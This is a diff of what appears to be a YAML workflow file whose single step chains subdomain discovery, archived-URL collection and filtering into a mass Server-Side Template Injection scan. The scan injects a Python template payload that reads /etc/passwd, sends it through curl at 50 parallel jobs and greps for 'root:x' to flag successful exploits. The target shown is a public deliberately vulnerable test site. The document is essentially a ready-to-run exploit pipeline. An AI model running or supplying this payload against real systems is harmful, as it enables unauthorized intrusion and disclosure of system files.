@@ -1,11 +1,8 @@
 description: The command finds subdomains, checks for Server-Side Template Injection by attempting to read /etc/passwd, and identifies successful exploits by searching for "root:x".
 params: target=testphp.vulnweb.com
-env:
-  - HOME: /root/
-  - LOG_DIR: ${HOME}/logs
-  - PATH: /usr/local/bin:${PATH}
+
 steps:
   - name: ssti
     command: bash
     script: |
-      subfinder -d ${target//\"} -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g -s | grep "root:x" || true
+      subfinder -d ${target} -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g -s | grep "root:x" || true
